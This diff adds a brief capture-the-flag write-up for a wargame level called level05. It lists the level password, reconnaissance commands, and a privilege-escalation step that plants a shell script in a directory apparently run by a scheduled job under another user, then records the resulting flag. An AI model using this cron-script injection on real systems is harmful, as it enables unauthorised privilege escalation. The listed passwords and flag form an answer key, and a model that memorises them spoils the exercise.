@@ -1,0 +1,9 @@
+level05 : ne2searoevaevoem4ov4ar8ap
+Process :
+    - find / -user flag05 2> /dev/null
+    - env | grep level05
+    - cat /usr/sbin/openarenaserver
+    - cat /var/mail/level05
+    - Go to /tmp and touch res and chmod 666 res
+    - Launch echo '#!/bin/sh' > /opt/openarenaserver/script && echo "getflag > /tmp/res" >> /opt/openarenaserver/script
+    - cat res get the flag = viuaaale9huek52boumoomioc
